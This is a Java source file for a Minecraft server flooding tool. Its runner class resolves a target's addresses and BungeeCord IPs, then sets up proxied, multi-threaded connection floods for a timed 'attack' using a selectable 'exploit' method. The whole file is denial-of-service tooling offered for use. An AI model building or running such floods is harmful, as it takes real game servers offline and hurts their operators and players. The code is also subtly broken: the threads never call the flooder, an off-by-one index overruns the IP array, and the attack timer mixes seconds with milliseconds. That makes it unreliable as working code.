package com.minecraftbot.flood;

import com.minecraftbot.util.SRVResolver;
import com.minecraftbot.option.Options;
import com.minecraftbot.proxy.Proxies;

import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

public class MultiFloodRunner {

    private Options options;
    private Proxies proxies;
    private int connections, failed, timed = 0;
    private int maxConnections = -1;
    private Flooders flooders = new Flooders();

    public MultiFloodRunner(Options options, Proxies proxies) {
        this.options = options;
        this.proxies = proxies;
    }

    public void run() {
        String host = options.getOption("host", "127.0.0.1");
        int port = options.getOption("port", 25565);
        boolean srvResolve = options.getOption("srvResolve", true);
        boolean alwaysResolve = options.getOption("alwaysResolve", false);
        int threads = options.getOption("threads", 1000);
        int connections = options.getOption("connections", 1000);
        int attackTime = options.getOption("attackTime", 30);
        boolean srvResolve2 = options.getOption("srvResolve2", false);
        int timeout = options.getOption("timeout", 0);
        boolean keepAlive = options.getOption("keepAlive", true);
        String floodName = options.getOption("exploit", "1");
        boolean removeFailure = options.getOption("removeFailure", false);
        Flooders.LOOP_AMOUNT = options.getOption("loopAmount", 1500);
        boolean print = options.getOption("print", false);

        if (srvResolve && alwaysResolve)
            System.out.println("ServerResolver and AlwaysResolve option are enabled at the same time, are you sure it's fine?");
        if (srvResolve) {
            String resolvedIp = SRVResolver.srv(host);
            String[] resolvedSplit = resolvedIp.split(":");
            host = resolvedSplit[0];
            port = Integer.parseInt(resolvedSplit[1]);
        }
        Flooders.Flooder flooder;
        if ((flooder = flooders.findById(String.valueOf(floodName))) == null) {
            System.out.println("Flooder with name " + floodName + " doesn't exist! List of floods: " + flooders.getFlooders().toString());
            System.exit(1);
            return;
        }
        ArrayList<String> hosts = new ArrayList<>();
        try {
            for (InetAddress resolved : InetAddress.getAllByName(host)) {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(resolved.getHostAddress(), port), 1000);
                    socket.getOutputStream().write(0);
                } catch (IOException exception) {
                    System.out.println("[SrvResolve2] Found ip, " + resolved.getHostAddress() + ", but couldn't connect = (");
                }
                hosts.add(resolved.getHostAddress());
                System.out.println("[SrvResolve2] Found ip! " + resolved.getHostAddress());
            }
        } catch (UnknownHostException e) {
            System.out.println("[SrvResolve2] Couldn't resolve ip! " + e.getMessage());
        }
        String[] ips = new String[hosts.size()];
        int counter = 0;
        for (String rHost : hosts) {
            ips[counter++] = rHost;
        }
        (new Timer()).scheduleAtFixedRate(new TimerTask() {
            public void run() {
                System.out.println("Successfully connected sockets: \033[32m" + connections + "\033[0m/" + maxConnections + "\nFailed: " + failed + ", timed: \033[31m" + timed + "\033[0m, proxies: " + proxies.size());
            }
        }, 8000L, 8000L);
        (new Thread(() -> {
            try {
                Thread.sleep(1000L + attackTime);
            } catch (Exception exception) {
            }
            System.out.println("Attack finished");
            System.exit(-1);
        })).start();
        System.out.println("Started attack! " + host + ":" + port + ", method: \033[34m" + floodName + "\033[0m, threads: " + threads + ", time attack: " + attackTime);
        System.out.println("Found multi bungees, size of bungeecords: \033[33m" + ips.length + "\033[0m");
        this.maxConnections = threads * connections;
        int id = 0;
        while (id < ips.length) {
            id++;
            String finalServerName = ips[id];
            System.out.println("Detected bungee: \033[35m" + finalServerName + "\033[0m");
            Thread start = new Thread(() -> {
                int j = 0;
                while (j < threads) {
                    j++;
                    Thread exploit = new Thread();
                    exploit.start();
                }
            });
            start.setName("Start flood thread: " + id);
            start.setPriority(10);
            start.start();
        }
    }

}
